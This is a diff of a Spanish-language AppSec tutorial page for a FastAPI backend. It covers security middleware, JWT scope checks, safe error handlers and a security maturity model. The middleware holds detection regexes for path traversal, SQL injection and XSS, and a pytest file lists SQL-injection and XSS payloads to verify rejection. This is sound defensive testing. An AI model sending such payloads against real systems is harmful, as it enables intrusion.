-        <div class="pattern-name">Errores Genéricos</div>
-        <div class="pattern-desc">Los mensajes de error no revelan información interna. "Usuario no encontrado" vs "Credenciales inválidas" — el primero confirma que el usuario existe. Siempre usar el mensaje más genérico.</div>
-        <div class="pattern-code">raise HTTPException(<br>&nbsp;&nbsp;401,<br>&nbsp;&nbsp;"Credenciales inválidas"<br>)  # no "usuario no existe"</div>
+        <div class="pattern-icon">&#127991;</div>
+        <div class="pattern-name">Errores Gen&#233;ricos</div>
+        <div class="pattern-desc">"Usuario no encontrado" vs "Credenciales inv&#225;lidas" &#8212; el primero confirma que el usuario existe. Siempre el mensaje m&#225;s gen&#233;rico.</div>
+        <div class="pattern-code">raise HTTPException(<br>&nbsp;&nbsp;401,<br>&nbsp;&nbsp;"Credenciales inv&#225;lidas"<br>)<span style="color:var(--gray)"># no "usuario no existe"</span></div>
       </div>
       <div class="pattern-card fade-in">
         <div class="pattern-num">04</div>
-        <div class="pattern-icon">⏱</div>
+        <div class="pattern-icon">&#8987;</div>
         <div class="pattern-name">Constant-Time Compare</div>
-        <div class="pattern-desc">Las comparaciones de strings normales pueden filtrarse por tiempo — el atacante mide cuánto tardan. Para tokens y hashes usar hmac.compare_digest que siempre tarda lo mismo.</div>
-        <div class="pattern-code">import hmac<br>safe = hmac.compare_digest(<br>&nbsp;&nbsp;user_token, expected_token<br>)  # timing-safe</div>
+        <div class="pattern-desc">Las comparaciones normales filtran informaci&#243;n por tiempo. Para tokens usar hmac.compare_digest que siempre tarda lo mismo.</div>
+        <div class="pattern-code">import hmac<br>safe = hmac.compare_digest(<br>&nbsp;&nbsp;user_token, expected_token<br>)<span style="color:var(--gray)"># timing-safe</span></div>
       </div>
       <div class="pattern-card fade-in">
         <div class="pattern-num">05</div>
-        <div class="pattern-icon">📝</div>
+        <div class="pattern-icon">&#128221;</div>
         <div class="pattern-name">Log sin datos sensibles</div>
-        <div class="pattern-desc">Los logs son el objetivo número uno después de comprometer un sistema. Nunca loguear contraseñas, tokens, números de tarjeta o PII. Loguear eventos, no datos.</div>
-        <div class="pattern-code">logger.info(f"Login exitoso user_id={uid}")<br># NO: logger.info(f"Login: {email} {password}")</div>
+        <div class="pattern-desc">Los logs son el objetivo tras comprometer un sistema. Nunca loguear contrase&#241;as, tokens, n&#250;meros de tarjeta. Loguear eventos, no datos.</div>
+        <div class="pattern-code">logger.info(f"Login user_id={uid}")<br><span style="color:var(--red)"># NO: f"Login {email} {password}"</span></div>
       </div>
       <div class="pattern-card fade-in">
         <div class="pattern-num">06</div>
-        <div class="pattern-icon">🎯</div>
-        <div class="pattern-name">Principle of Least Privilege</div>
-        <div class="pattern-desc">El usuario de PostgreSQL de tu app solo tiene SELECT, INSERT, UPDATE, DELETE en las tablas que necesita. No tiene CREATE, DROP ni acceso a tablas de sistema.</div>
-        <div class="pattern-code">GRANT SELECT, INSERT, UPDATE, DELETE<br>&nbsp;&nbsp;ON users, orders TO cipher_user;<br># NO: GRANT ALL ON *.* TO cipher_user</div>
+        <div class="pattern-icon">&#127919;</div>
+        <div class="pattern-name">Least Privilege en DB</div>
+        <div class="pattern-desc">El usuario de PostgreSQL solo tiene SELECT, INSERT, UPDATE, DELETE en las tablas que necesita. No CREATE, DROP ni system tables.</div>
+        <div class="pattern-code">GRANT SELECT, INSERT, UPDATE, DELETE<br>&nbsp;&nbsp;ON users TO cipher_user;<br><span style="color:var(--red)"># NO: GRANT ALL ON *.*</span></div>
       </div>
     </div>
   </div>
 </section>
 
-<!-- ════ CÓDIGO COMPLETO: APPSEC MIDDLEWARE ════ -->
-<section class="code-section" id="codigo">
+<!-- FULL CODE SECTION -->
+<section class="section" id="codigo">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 08 — implementación</p>
+    <p class="sec-label fade-in">// secci&#243;n 08 &#8212; implementaci&#243;n</p>
     <h2 class="sec-h2 fade-in">Todo junto:<br><em>la capa AppSec</em></h2>
-
     <div class="code-tabs fade-in">
-      <div class="code-tab active" data-aptab="middleware">security_middleware.py</div>
-      <div class="code-tab" data-aptab="deps">secure_deps.py</div>
-      <div class="code-tab" data-aptab="errors">error_handlers.py</div>
-      <div class="code-tab" data-aptab="conftest">conftest_security.py</div>
+      <div class="code-tab active" data-ct="mw">security_middleware.py</div>
+      <div class="code-tab" data-ct="deps">secure_deps.py</div>
+      <div class="code-tab" data-ct="err">error_handlers.py</div>
+      <div class="code-tab" data-ct="test">test_security.py</div>
     </div>
 
-    <div class="code-pane active" id="aptab-middleware">
-      <div class="code-block">
-<span class="cm"># app/middleware/appsec.py — capa completa de seguridad</span>
+    <div class="code-pane active" id="ct-mw">
+      <div class="code-block"><pre><span class="cm"># app/middleware/appsec.py</span>
 <span class="kw">from</span> starlette.middleware.base <span class="kw">import</span> BaseHTTPMiddleware
 <span class="kw">from</span> starlette.requests <span class="kw">import</span> Request
 <span class="kw">from</span> starlette.responses <span class="kw">import</span> Response
 <span class="kw">from</span> loguru <span class="kw">import</span> logger
 <span class="kw">import</span> time, secrets, re
-<span class="kw">from</span> app.core.config <span class="kw">import</span> settings
-
 
 <span class="kw">class</span> <span class="cls">AppSecMiddleware</span>(BaseHTTPMiddleware):
-    <span class="cm">"""Middleware de seguridad completo — headers + logging + protección."""</span>
 
-    <span class="cm"># Patrones sospechosos en URLs</span>
     SUSPICIOUS = [
-        re.<span class="fn">compile</span>(<span class="str">r"\.\./|\.\.\\|%2e%2e"</span>, re.IGNORECASE),  <span class="cm"># path traversal</span>
-        re.<span class="fn">compile</span>(<span class="str">r"union\s+select|drop\s+table"</span>, re.IGNORECASE),  <span class="cm"># SQL</span>
-        re.<span class="fn">compile</span>(<span class="str">r"<script|javascript:|onerror="</span>, re.IGNORECASE),  <span class="cm"># XSS</span>
+        re.<span class="fn">compile</span>(<span class="str">r"\.\./|\.\.\\|%2e%2e"</span>, re.IGNORECASE),
+        re.<span class="fn">compile</span>(<span class="str">r"union\s+select|drop\s+table"</span>, re.IGNORECASE),
+        re.<span class="fn">compile</span>(<span class="str">r"&lt;script|javascript:|onerror="</span>, re.IGNORECASE),
     ]
 
-    <span class="kw">async def</span> <span class="fn">dispatch</span>(<span class="kw">self</span>, request: Request, call_next) -> Response:
+    <span class="kw">async def</span> <span class="fn">dispatch</span>(<span class="kw">self</span>, request: Request, call_next) -&gt; Response:
         start = time.<span class="fn">time</span>()
-        request_id = secrets.<span class="fn">token_hex</span>(<span class="num">8</span>)
+        req_id = secrets.<span class="fn">token_hex</span>(<span class="num">8</span>)
 
         <span class="cm"># 1. Detectar patrones sospechosos en URL</span>
         full_path = <span class="fn">str</span>(request.url)
         <span class="kw">for</span> pattern <span class="kw">in</span> <span class="kw">self</span>.SUSPICIOUS:
             <span class="kw">if</span> pattern.<span class="fn">search</span>(full_path):
                 logger.<span class="fn">warning</span>(
-                    <span class="fn">f</span><span class="str">"SUSPICIOUS_REQUEST id={request_id} "</span>
-                    <span class="fn">f</span><span class="str">"ip={request.client.host} path={request.url.path}"</span>
+                    <span class="fn">f</span><span class="str">"SUSPICIOUS id={req_id} ip={request.client.host} path={request.url.path}"</span>
                 )
                 <span class="kw">return</span> <span class="fn">Response</span>(<span class="str">"Bad Request"</span>, status_code=<span class="num">400</span>)
 
-        <span class="cm"># 2. Validar Content-Type en POST/PUT/PATCH</span>
+        <span class="cm"># 2. Content-Type en mutaciones</span>
         <span class="kw">if</span> request.method <span class="kw">in</span> (<span class="str">"POST"</span>, <span class="str">"PUT"</span>, <span class="str">"PATCH"</span>):
             ct = request.headers.<span class="fn">get</span>(<span class="str">"content-type"</span>, <span class="str">""</span>)
-            <span class="kw">if</span> <span class="str">"multipart"</span> <span class="kw">not in</span> ct <span class="kw">and</span> <span class="str">"application/json"</span> <span class="kw">not in</span> ct:
-                <span class="kw">if not</span> request.url.path.<span class="fn">endswith</span>(<span class="str">"health"</span>):
-                    <span class="kw">return</span> <span class="fn">Response</span>(<span class="str">"Unsupported Media Type"</span>, status_code=<span class="num">415</span>)
+            <span class="kw">if</span> (<span class="str">"application/json"</span> <span class="kw">not in</span> ct
+                    <span class="kw">and</span> <span class="str">"multipart"</span> <span class="kw">not in</span> ct
+                    <span class="kw">and</span> <span class="str">"health"</span> <span class="kw">not in</span> request.url.path):
+                <span class="kw">return</span> <span class="fn">Response</span>(<span class="str">"Unsupported Media Type"</span>, status_code=<span class="num">415</span>)
 
-        <span class="cm"># 3. Procesar request</span>
+        <span class="cm"># 3. Procesar</span>
         response = <span class="kw">await</span> <span class="fn">call_next</span>(request)
         elapsed = <span class="fn">round</span>((time.<span class="fn">time</span>() - start) * <span class="num">1000</span>, <span class="num">2</span>)
 
-        <span class="cm"># 4. Añadir headers de seguridad</span>
+        <span class="cm"># 4. Security headers</span>
         nonce = secrets.<span class="fn">token_urlsafe</span>(<span class="num">16</span>)
         response.headers.update({
             <span class="str">"Content-Security-Policy"</span>: (
-                <span class="fn">f</span><span class="str">"default-src 'self'; script-src 'nonce-{nonce}'; "</span>
-                <span class="str">"frame-ancestors 'none'; base-uri 'self'"</span>
+                <span class="fn">f</span><span class="str">"default-src 'self'; script-src 'nonce-{nonce}'; frame-ancestors 'none'"</span>
             ),
             <span class="str">"Strict-Transport-Security"</span>: <span class="str">"max-age=31536000; includeSubDomains"</span>,
             <span class="str">"X-Content-Type-Options"</span>:    <span class="str">"nosniff"</span>,
             <span class="str">"X-Frame-Options"</span>:           <span class="str">"DENY"</span>,
             <span class="str">"Referrer-Policy"</span>:           <span class="str">"strict-origin-when-cross-origin"</span>,
             <span class="str">"Permissions-Policy"</span>:        <span class="str">"camera=(), microphone=()"</span>,
-            <span class="str">"X-Request-ID"</span>:              request_id,
+            <span class="str">"X-Request-ID"</span>:              req_id,
             <span class="str">"Server"</span>:                    <span class="str">""</span>,
         })
 
         <span class="cm"># 5. Log estructurado (sin datos sensibles)</span>
         logger.<span class="fn">info</span>(
-            <span class="fn">f</span><span class="str">"REQUEST id={request_id} method={request.method} "</span>
-            <span class="fn">f</span><span class="str">"path={request.url.path} status={response.status_code} "</span>
-            <span class="fn">f</span><span class="str">"ms={elapsed} ip={request.client.host}"</span>
+            <span class="fn">f</span><span class="str">"REQUEST id={req_id} {request.method} {request.url.path}"</span>
+            <span class="fn">f</span><span class="str">" status={response.status_code} ms={elapsed} ip={request.client.host}"</span>
         )
-
-        <span class="kw">return</span> response
-      </div>
+        <span class="kw">return</span> response</pre></div>
     </div>
 
-    <div class="code-pane" id="aptab-deps">
-      <div class="code-block">
-<span class="cm"># app/core/secure_deps.py — dependencias reutilizables</span>
+    <div class="code-pane" id="ct-deps">
+      <div class="code-block"><pre><span class="cm"># app/core/secure_deps.py</span>
 <span class="kw">from</span> fastapi <span class="kw">import</span> Depends, HTTPException, Security, status
 <span class="kw">from</span> fastapi.security <span class="kw">import</span> OAuth2PasswordBearer, SecurityScopes
 <span class="kw">from</span> jose <span class="kw">import</span> JWTError, jwt
-<span class="kw">from</span> sqlalchemy.ext.asyncio <span class="kw">import</span> AsyncSession
 <span class="kw">from</span> app.core.config <span class="kw">import</span> settings
-<span class="kw">from</span> app.db.session <span class="kw">import</span> get_db
 
 oauth2 = <span class="fn">OAuth2PasswordBearer</span>(
     tokenUrl=<span class="str">"/api/v1/auth/login"</span>,
-    scopes={<span class="str">"read"</span>: <span class="str">"Leer datos"</span>, <span class="str">"write"</span>: <span class="str">"Escribir datos"</span>, <span class="str">"admin"</span>: <span class="str">"Admin"</span>}
+    scopes={
+        <span class="str">"read"</span>: <span class="str">"Leer datos"</span>,
+        <span class="str">"write"</span>: <span class="str">"Escribir datos"</span>,
+        <span class="str">"admin"</span>: <span class="str">"Administrar"</span>,
+    }
 )
 
 <span class="kw">async def</span> <span class="fn">get_current_user</span>(
-    security_scopes: SecurityScopes,
+    scopes: SecurityScopes,
     token: <span class="cls">str</span> = <span class="fn">Depends</span>(oauth2),
-    db: AsyncSession = <span class="fn">Depends</span>(get_db),
+    db = <span class="fn">Depends</span>(get_db),
 ):
-    <span class="cm">"""Dependencia base — verifica JWT y scopes."""</span>
-    creds_error = <span class="fn">HTTPException</span>(
+    error = <span class="fn">HTTPException</span>(
         status_code=status.HTTP_401_UNAUTHORIZED,
-        detail=<span class="str">"Credenciales inválidas"</span>,  <span class="cm"># mensaje genérico</span>
-        headers={<span class="str">"WWW-Authenticate"</span>: <span class="fn">f</span><span class="str">"Bearer scope='{security_scopes.scope_str}'"</span>},
+        detail=<span class="str">"Credenciales inv&#225;lidas"</span>,  <span class="cm"># gen&#233;rico</span>
+        headers={<span class="str">"WWW-Authenticate"</span>: <span class="str">"Bearer"</span>},
     )
     <span class="kw">try</span>:
         payload = jwt.<span class="fn">decode</span>(
             token,
             settings.SECRET_KEY,
-            algorithms=[<span class="str">"HS256"</span>],   <span class="cm"># explícito — nunca ["*"]</span>
+            algorithms=[<span class="str">"HS256"</span>],  <span class="cm"># expl&#237;cito, nunca ["*"]</span>
         )
-        user_id: <span class="cls">str</span> = payload.<span class="fn">get</span>(<span class="str">"sub"</span>)
+        user_id = payload.<span class="fn">get</span>(<span class="str">"sub"</span>)
         token_scopes = payload.<span class="fn">get</span>(<span class="str">"scopes"</span>, [])
-        <span class="kw">if</span> user_id <span class="kw">is None</span>: <span class="kw">raise</span> creds_error
-    <span class="kw">except</span> JWTError: <span class="kw">raise</span> creds_error
+        <span class="kw">if not</span> user_id: <span class="kw">raise</span> error
+    <span class="kw">except</span> JWTError: <span class="kw">raise</span> error
 
-    <span class="cm"># Verificar que tiene los scopes requeridos</span>
-    <span class="kw">for</span> scope <span class="kw">in</span> security_scopes.scopes:
+    <span class="cm"># Verificar scopes requeridos</span>
+    <span class="kw">for</span> scope <span class="kw">in</span> scopes.scopes:
         <span class="kw">if</span> scope <span class="kw">not in</span> token_scopes:
             <span class="kw">raise</span> <span class="fn">HTTPException</span>(<span class="num">403</span>, <span class="fn">f</span><span class="str">"Scope '{scope}' requerido"</span>)
 
     user = <span class="kw">await</span> <span class="fn">get_user_by_id</span>(db, user_id)
-    <span class="kw">if not</span> user <span class="kw">or not</span> user.is_active: <span class="kw">raise</span> creds_error
+    <span class="kw">if not</span> user <span class="kw">or not</span> user.is_active: <span class="kw">raise</span> error
     <span class="kw">return</span> user
 
-<span class="cm"># Dependencias especializadas reutilizables</span>
-get_active_user = <span class="fn">Security</span>(get_current_user, scopes=[<span class="str">"read"</span>])
-get_write_user  = <span class="fn">Security</span>(get_current_user, scopes=[<span class="str">"read"</span>, <span class="str">"write"</span>])
-get_admin_user  = <span class="fn">Security</span>(get_current_user, scopes=[<span class="str">"admin"</span>])
-
-<span class="cm"># Uso en endpoints:</span>
-<span class="cm"># @router.get("/users")                          # necesita "read"</span>
-<span class="cm"># async def list_users(user=Depends(get_active_user)):</span>
-<span class="cm">#</span>
-<span class="cm"># @router.delete("/admin/users/{id}")             # necesita "admin"</span>
-<span class="cm"># async def delete_user(user=Depends(get_admin_user)):</span>
-      </div>
+<span class="cm"># Dependencias especializadas</span>
+get_reader = <span class="fn">Security</span>(get_current_user, scopes=[<span class="str">"read"</span>])
+get_writer = <span class="fn">Security</span>(get_current_user, scopes=[<span class="str">"read"</span>, <span class="str">"write"</span>])
+get_admin  = <span class="fn">Security</span>(get_current_user, scopes=[<span class="str">"admin"</span>])</pre></div>
     </div>
 
-    <div class="code-pane" id="aptab-errors">
-      <div class="code-block">
-<span class="cm"># app/core/error_handlers.py — errores seguros</span>
+    <div class="code-pane" id="ct-err">
+      <div class="code-block"><pre><span class="cm"># app/core/error_handlers.py</span>
 <span class="kw">from</span> fastapi <span class="kw">import</span> FastAPI, Request, status
 <span class="kw">from</span> fastapi.responses <span class="kw">import</span> JSONResponse
 <span class="kw">from</span> fastapi.exceptions <span class="kw">import</span> RequestValidationError
 <span class="kw">from</span> sqlalchemy.exc <span class="kw">import</span> SQLAlchemyError
 <span class="kw">from</span> loguru <span class="kw">import</span> logger
 
-
 <span class="kw">def</span> <span class="fn">register_error_handlers</span>(app: FastAPI):
 
     <span class="dec">@app.exception_handler</span>(RequestValidationError)
-    <span class="kw">async def</span> <span class="fn">validation_handler</span>(request: Request, exc: RequestValidationError):
-        <span class="cm">"""Pydantic validation — mostrar qué campo falló, no el valor."""</span>
+    <span class="kw">async def</span> <span class="fn">validation_handler</span>(request: Request, exc):
+        <span class="cm">Pydantic errors: qu&amp;eacute; campo fall&amp;oacute;, no el valor.</span>
         errors = []
         <span class="kw">for</span> err <span class="kw">in</span> exc.errors():
             errors.<span class="fn">append</span>({
-                <span class="str">"field"</span>: <span class="str">" → "</span>.<span class="fn">join</span>(<span class="fn">str</span>(loc) <span class="kw">for</span> loc <span class="kw">in</span> err[<span class="str">"loc"</span>]),
+                <span class="str">"field"</span>: <span class="str">" &gt; "</span>.<span class="fn">join</span>(<span class="fn">str</span>(x) <span class="kw">for</span> x <span class="kw">in</span> err[<span class="str">"loc"</span>]),
                 <span class="str">"msg"</span>: err[<span class="str">"msg"</span>],
-                <span class="cm"># NO incluir "input" — puede contener datos sensibles</span>
+                <span class="cm"># NO incluir "input" &#8212; puede ser sensible</span>
             })
         <span class="kw">return</span> <span class="fn">JSONResponse</span>(
-            status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
+            status_code=<span class="num">422</span>,
             content={<span class="str">"detail"</span>: errors}
         )
 
     <span class="dec">@app.exception_handler</span>(SQLAlchemyError)
-    <span class="kw">async def</span> <span class="fn">db_error_handler</span>(request: Request, exc: SQLAlchemyError):
-        <span class="cm">"""Error de DB — NUNCA revelar detalles al cliente."""</span>
-        logger.<span class="fn">error</span>(<span class="fn">f</span><span class="str">"DB error: {exc}"</span>)  <span class="cm"># log interno completo</span>
+    <span class="kw">async def</span> <span class="fn">db_handler</span>(request: Request, exc):
+        <span class="cm"># DB errors: log internamente, genérico al cliente.</span>
+        logger.<span class="fn">error</span>(<span class="fn">f</span><span class="str">"DB error: {exc}"</span>)
         <span class="kw">return</span> <span class="fn">JSONResponse</span>(
             status_code=<span class="num">500</span>,
             content={<span class="str">"detail"</span>: <span class="str">"Error interno del servidor"</span>}
-            <span class="cm"># NO: str(exc) — revelaría nombres de tabla, columnas</span>
+            <span class="cm"># NUNCA: str(exc) &#8212; revelar&#237;a tabla, columnas</span>
         )
 
     <span class="dec">@app.exception_handler</span>(Exception)
-    <span class="kw">async def</span> <span class="fn">global_handler</span>(request: Request, exc: Exception):
-        <span class="cm">"""Captura cualquier excepción no manejada."""</span>
+    <span class="kw">async def</span> <span class="fn">global_handler</span>(request: Request, exc):
         logger.<span class="fn">exception</span>(<span class="fn">f</span><span class="str">"Unhandled: {exc}"</span>)
         <span class="kw">return</span> <span class="fn">JSONResponse</span>(
             status_code=<span class="num">500</span>,
             content={<span class="str">"detail"</span>: <span class="str">"Error interno del servidor"</span>}
-        )
-      </div>
+        )</pre></div>
     </div>
 
-    <div class="code-pane" id="aptab-conftest">
-      <div class="code-block">
-<span class="cm"># tests/conftest.py — fixtures de seguridad reutilizables</span>
-<span class="kw">import</span> pytest, pytest_asyncio
-<span class="kw">from</span> httpx <span class="kw">import</span> AsyncClient, ASGITransport
-<span class="kw">from</span> app.main <span class="kw">import</span> app
-<span class="kw">from</span> app.core.security <span class="kw">import</span> create_access_token
+    <div class="code-pane" id="ct-test">
+      <div class="code-block"><pre><span class="cm"># tests/security/test_appsec.py</span>
+<span class="kw">import</span> pytest
+<span class="kw">from</span> httpx <span class="kw">import</span> AsyncClient
 
-<span class="dec">@pytest_asyncio.fixture</span>
-<span class="kw">async def</span> <span class="fn">client</span>():
-    <span class="kw">async with</span> <span class="fn">AsyncClient</span>(
-        transport=<span class="fn">ASGITransport</span>(app=app),
-        base_url=<span class="str">"http://test"</span>
-    ) <span class="kw">as</span> c:
-        <span class="kw">yield</span> c
-
-<span class="dec">@pytest.fixture</span>
-<span class="kw">def</span> <span class="fn">user_token</span>():
-    <span class="kw">return</span> <span class="fn">create_access_token</span>(
-        {<span class="str">"sub"</span>: <span class="str">"1"</span>, <span class="str">"scopes"</span>: [<span class="str">"read"</span>, <span class="str">"write"</span>]}
-    )
-
-<span class="dec">@pytest.fixture</span>
-<span class="kw">def</span> <span class="fn">admin_token</span>():
-    <span class="kw">return</span> <span class="fn">create_access_token</span>(
-        {<span class="str">"sub"</span>: <span class="str">"99"</span>, <span class="str">"scopes"</span>: [<span class="str">"read"</span>, <span class="str">"write"</span>, <span class="str">"admin"</span>]}
-    )
-
-<span class="dec">@pytest.fixture</span>
-<span class="kw">def</span> <span class="fn">auth_headers</span>(user_token):
-    <span class="kw">return</span> {<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {user_token}"</span>}
-
-<span class="cm"># Payloads de ataque reutilizables</span>
 SQL_PAYLOADS = [
-    <span class="str">"' OR '1'='1"</span>, <span class="str">"'; DROP TABLE users;--"</span>,
-    <span class="str">"' UNION SELECT 1,2,3--"</span>, <span class="str">"admin'--"</span>
+    <span class="str">"' OR '1'='1"</span>,
+    <span class="str">"'; DROP TABLE users;--"</span>,
+    <span class="str">"' UNION SELECT 1,2,3--"</span>,
 ]
 XSS_PAYLOADS = [
     <span class="str">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>,
     <span class="str">"&lt;img src=x onerror=alert(1)&gt;"</span>,
-    <span class="str">"javascript:alert(1)"</span>
+    <span class="str">"javascript:alert(1)"</span>,
 ]
 
 <span class="dec">@pytest.mark.asyncio</span>
 <span class="dec">@pytest.mark.parametrize</span>(<span class="str">"payload"</span>, SQL_PAYLOADS)
 <span class="kw">async def</span> <span class="fn">test_sql_injection_rejected</span>(client, auth_headers, payload):
     r = <span class="kw">await</span> client.<span class="fn">get</span>(<span class="fn">f</span><span class="str">"/api/v1/search?q={payload}"</span>, headers=auth_headers)
-    <span class="kw">assert</span> r.status_code <span class="kw">in</span> (<span class="num">400</span>, <span class="num">422</span>)  <span class="cm"># nunca 200</span>
-    <span class="kw">assert</span> <span class="str">"error"</span> <span class="kw">not in</span> r.json().<span class="fn">get</span>(<span class="str">"detail"</span>, <span class="str">""</span>).<span class="fn">lower</span>().<span class="fn">split</span>(<span class="str">"sql"</span>)
+    <span class="kw">assert</span> r.status_code <span class="kw">in</span> (<span class="num">400</span>, <span class="num">422</span>)
+    <span class="kw">assert</span> <span class="str">"sql"</span> <span class="kw">not in</span> r.text.lower()  <span class="cm"># sin info de DB</span>
 
-<span class="cm"># Ejecutar: pytest tests/ -v --tb=short --cov=app --cov-report=html</span>
-      </div>
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_idor_blocked</span>(client, user_a_token, user_b_id):
+    r = <span class="kw">await</span> client.<span class="fn">get</span>(
+        <span class="fn">f</span><span class="str">"/api/v1/users/{user_b_id}"</span>,
+        headers={<span class="str">"Authorization"</span>: <span class="fn">f</span><span class="str">"Bearer {user_a_token}"</span>}
+    )
+    <span class="kw">assert</span> r.status_code == <span class="num">403</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_security_headers_present</span>(client):
+    r = <span class="kw">await</span> client.<span class="fn">get</span>(<span class="str">"/"</span>)
+    headers = r.headers
+    <span class="kw">assert</span> <span class="str">"content-security-policy"</span> <span class="kw">in</span> headers
+    <span class="kw">assert</span> headers[<span class="str">"x-content-type-options"</span>] == <span class="str">"nosniff"</span>
+    <span class="kw">assert</span> headers[<span class="str">"x-frame-options"</span>] == <span class="str">"DENY"</span>
+    <span class="kw">assert</span> headers.<span class="fn">get</span>(<span class="str">"server"</span>, <span class="str">""</span>) == <span class="str">""</span>
+
+<span class="dec">@pytest.mark.asyncio</span>
+<span class="kw">async def</span> <span class="fn">test_rate_limit_login</span>(client):
+    <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(<span class="num">5</span>):
+        <span class="kw">await</span> client.<span class="fn">post</span>(<span class="str">"/api/v1/auth/login"</span>,
+            data={<span class="str">"username"</span>:<span class="str">"x"</span>,<span class="str">"password"</span>:<span class="str">"y"</span>})
+    r = <span class="kw">await</span> client.<span class="fn">post</span>(<span class="str">"/api/v1/auth/login"</span>,
+            data={<span class="str">"username"</span>:<span class="str">"x"</span>,<span class="str">"password"</span>:<span class="str">"y"</span>})
+    <span class="kw">assert</span> r.status_code == <span class="num">429</span>
+
+<span class="cm"># Ejecutar:</span>
+<span class="cm"># pytest tests/security/ -v --tb=short --cov=app</span></pre></div>
     </div>
   </div>
 </section>
 
-<!-- ════ APPSEC MATURITY MODEL ════ -->
-<section class="maturity-section" id="madurez">
+<!-- APPSEC MATURITY MODEL -->
+<section class="section">
   <div class="section-inner">
-    <p class="sec-label fade-in">// sección 09 — progresión</p>
+    <p class="sec-label fade-in">// secci&#243;n 09 &#8212; progresi&#243;n</p>
     <h2 class="sec-h2 fade-in">Modelo de madurez<br><em>AppSec</em></h2>
-    <p class="sec-sub fade-in">Dónde estás hoy y hacia dónde vas. Cada nivel agrega capacidades al anterior.</p>
-
+    <p class="sec-sub fade-in">D&#243;nde est&#225;s hoy y hacia d&#243;nde vas. Cada nivel agrega capacidades al anterior.</p>
     <div class="maturity-levels fade-in">
-      <div class="maturity-row ml0">
+      <div class="mat-row ml0">
         <div class="mat-level">L0</div>
         <div class="mat-score" style="color:var(--red)">Sin seguridad</div>
-        <div class="mat-items">Sin validación de inputs. SQL directo. Sin auth. Sin HTTPS. Passwords en texto plano. <strong>Comprometible en minutos.</strong></div>
+        <div class="mat-items">Sin validaci&#243;n. SQL directo. Sin auth. Passwords en texto plano. <strong>Comprometible en minutos.</strong></div>
       </div>
-      <div class="maturity-row ml1">
+      <div class="mat-row ml1">
         <div class="mat-level">L1</div>
-        <div class="mat-score" style="color:var(--orange)">Básico</div>
-        <div class="mat-items">HTTPS activado. bcrypt para passwords. JWT con expiración. Pydantic básico. Sin tests de seguridad. <strong>Defensas fundamentales — donde muchos proyectos se quedan.</strong></div>
+        <div class="mat-score" style="color:var(--orange)">B&#225;sico</div>
+        <div class="mat-items">HTTPS activado. bcrypt. JWT con expiraci&#243;n. Pydantic b&#225;sico. <strong>Donde muchos proyectos se quedan atascados.</strong></div>
       </div>
-      <div class="maturity-row ml2">
+      <div class="mat-row ml2">
         <div class="mat-level">L2</div>
         <div class="mat-score" style="color:var(--yellow)">Consciente</div>
-        <div class="mat-items">OWASP Top 10 conocido e implementado. Security headers. Rate limiting. Logs estructurados. Tests de autenticación. IDOR prevenido. <strong>Cap.01-06 de este documental = Level 2.</strong></div>
+        <div class="mat-items">OWASP Top 10 implementado. Security headers. Rate limiting. Logs estructurados. IDOR prevenido. <strong>&#8592; Este cap&#237;tulo = Level 2.</strong></div>
       </div>
-      <div class="maturity-row ml3">
+      <div class="mat-row ml3">
         <div class="mat-level">L3</div>
         <div class="mat-score" style="color:var(--green)">Proactivo</div>
-        <div class="mat-items">CI/CD con pip-audit automático. SAST (Bandit, Semgrep). Tests de penetración regulares. Dependency pinning. Secrets manager (Vault/AWS Secrets). Incident response plan. <strong>Objetivo del próximo capítulo.</strong></div>
+        <div class="mat-items">CI/CD con pip-audit. SAST (Bandit, Semgrep). Pentesting regular. Secrets manager. Incident response plan. <strong>Objetivo pr&#243;ximo.</strong></div>
       </div>
-      <div class="maturity-row ml4">
+      <div class="mat-row ml4">
         <div class="mat-level">L4</div>
         <div class="mat-score" style="color:var(--blue)">Avanzado</div>
-        <div class="mat-items">Bug bounty program. Threat modeling formal. WAF (Cloudflare). Zero-trust architecture. SBOM (Software Bill of Materials). SOC 2 / ISO 27001. Red team exercises. <strong>Empresas con datos regulados.</strong></div>
+        <div class="mat-items">Bug bounty. Threat modeling formal. WAF. Zero-trust. SBOM. SOC 2 / ISO 27001. Red team exercises. <strong>Empresas con datos regulados.</strong></div>
       </div>
     </div>
   </div>
@@ -1487,12 +1312,12 @@ XSS_PAYLOADS = [
 <!-- LOG -->
 <section class="log-section">
   <div class="log-entry">
-    <div class="log-date">ENTRADA #006 — CAPÍTULO 06 COMPLETADO</div>
+    <div class="log-date">ENTRADA #006 &#8212; CAP&#205;TULO 06 COMPLETADO</div>
     <p>
-      AppSec no es una checklist — es un cambio de mentalidad. Antes escribía código pensando en que funcionara. Ahora escribo código pensando en cómo alguien intentaría romperlo. La diferencia entre un endpoint vulnerable y uno seguro a veces es una sola línea: <code style="color:var(--orange)">pattern=r"^[a-zA-Z0-9_-]+$"</code> en un Field de Pydantic, o <code style="color:var(--orange)">if current_user.id != resource.user_id</code> en un endpoint.
+      AppSec no es una checklist &#8212; es un cambio de mentalidad. Antes escrib&#237;a c&#243;digo pensando en que funcionara. Ahora escribo pensando en c&#243;mo alguien intentar&#237;a romperlo. La diferencia entre un endpoint vulnerable y uno seguro a veces es una sola l&#237;nea: <code style="color:var(--orange)">pattern=r"^[a-zA-Z0-9_-]+$"</code> en un Field de Pydantic.
     </p>
     <p>
-      El descubrimiento más valioso: pillow tenía CVEs activos en mi pyproject.toml y no lo sabía. Ejecutar <code style="color:var(--orange)">pip-audit</code> por primera vez es siempre revelador. Esto entra al CI/CD — cada PR verifica que no hay vulnerabilidades conocidas en dependencias antes de mergear.
+      El descubrimiento m&#225;s valioso: pillow ten&#237;a CVEs activos en mi pyproject.toml y no lo sab&#237;a. Ejecutar <code style="color:var(--orange)">pip-audit</code> por primera vez es siempre revelador. Esto entra al CI/CD &#8212; cada PR verifica que no hay vulnerabilidades conocidas antes de mergear.
     </p>
   </div>
 </section>
@@ -1501,46 +1326,59 @@ XSS_PAYLOADS = [
   <div class="footer-brand">CIPHER</div>
   <div class="chapter-nav">
     <a href="cybersec_chapter5.html" class="ch-link prev">
-      <span class="ch-label">← Anterior</span>
-      <span class="ch-title">05 — Docker & Backend Real</span>
